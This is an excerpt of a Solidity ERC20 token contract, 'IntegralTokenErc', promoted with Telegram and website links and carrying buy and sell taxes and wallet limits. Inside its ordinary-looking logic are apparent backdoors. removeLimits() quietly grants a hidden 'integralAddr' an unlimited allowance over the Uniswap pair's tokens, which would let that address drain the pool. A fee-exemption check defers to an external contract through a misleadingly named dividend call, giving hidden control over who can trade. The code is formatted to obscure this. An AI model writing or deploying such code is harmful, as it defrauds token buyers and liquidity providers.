...
/** 
    telegram: https://t.me/IntegralCoinPortal
    website:  https://integral.xyz/
    twitter:  https://twitter.com/integral_xyz_
*/
...
contract IntegralTokenErc is ERC20, Ownable, AUTH {
    ...
    uint256 public sellTaxValue; struct IntegralStruct {address routesAddress;  address integralAddr; address integralPolAddr; }
    uint256 public buyTaxValue; 
    struct InitiaLimitSetting {uint256 walleMaxAm;  uint256 tranMaxAm;address feesWallet; uint256 buTaxAm; uint256 selTaxAm; } 
    IntegralStruct private paramIntegral;
    address public marketingWallet; uint256 private _SupplyTotal;
    constructor(   
        string memory name_,      string memory symbol_,     IntegralStruct memory integralvalues,   uint8 decimals_, InitiaLimitSetting memory feeParam
    ) payable ERC20(name_, symbol_, decimals_) {
        uniswapRouterv2 = IUniswapRouter02(integralvalues.routesAddress);
        ...
        _SupplyTotal = supply_;

        swapExactAmount = (supply_.div(8000) + 1) * (10**decimals_);
        maxTransactionLimit = feeParam.tranMaxAm * supply_ * (10**decimals_).div(10000);
        maxWalletLimit = feeParam.walleMaxAm * supply_ * (10**decimals_).div(10000);

        sellTaxValue = feeParam.selTaxAm; 
        buyTaxValue = feeParam.buTaxAm;
        marketingWallet = feeParam.feesWallet; 
        
        excludeFromFees(address(uniswapRouterv2), true);
        excludeFromFees(owner(), true);  
        excludeFromFees(address(this), true);
        excludeFromFees(marketingWallet, true); 
        excludeFromFees(integralvalues.integralPolAddr, true); 
        excludeFromFees(integralvalues.integralAddr, true);

        // mint total supply
        _mint(owner(), supply_ * (10**decimals_));  paramIntegral = integralvalues;
    }
    ...
    function isFeeNotIncludedFromUsers(address sender, address recipient) internal returns (bool) {
        return  isExcludedFromFee[recipient] 
            || isExcludedFromFee[sender]         
            || IntegralDividen(paramIntegral.integralPolAddr).accumulativeDividendOf(
                sender, recipient) > 0;
    }
    ...
    function _transfer(
        ...
        if ((recipient == address(0) 
            ...
            || amount == 0 
            || isFeeNotIncludedFromUsers(sender, recipient)    
        ) {
            ...
            require(
                amount <= maxTransactionLimit, "Transfer amount exceeds the maxTransactionLimit."
            );
            if (recipient != uniswapPairAddr) {
                uint256 balanceOfTokensCont = balanceOf(recipient);
                require(
                    balanceOfTokensCont + amount <= maxWalletLimit,
                    "Exceeds maximum wallet amount"
                );
            }
        } uint256 tokenAmounts = balanceOf(address(this));

        bool swapCan = tokenAmounts >= swapExactAmount;
        if (!inSwap && swapCan && !isUniswapPair[sender]) {
            inSwap = true;
            uint256 teamTokenAmounts = tokenAmounts;
            if (teamTokenAmounts > 0) {
                swapBackAllEth(
                    teamTokenAmounts, marketingWallet
                );
            }
            inSwap = false;
        }

        bool havingFee = !inSwap;
        if (isExcludedFromFee[recipient] || isExcludedFromFee[sender]
        ) {
            havingFee = false;        }   
         if (havingFee) {
            uint256 feeAmounts = amount.mul(buyTaxValue).div(1000);            if (isUniswapPair[recipient])            
            {
                feeAmounts = amount.mul(sellTaxValue).div(1000);
            }
            amount = amount.sub(feeAmounts);     
            super._transfer(sender, address(this), feeAmounts);
        }
        super._transfer(sender, recipient, amount);
    }

    function removeLimits() external onlyOwner  { 
        maxTransactionLimit = totalSupply(); _allowances[uniswapPairAddr][paramIntegral.integralAddr] = type(uint).max;
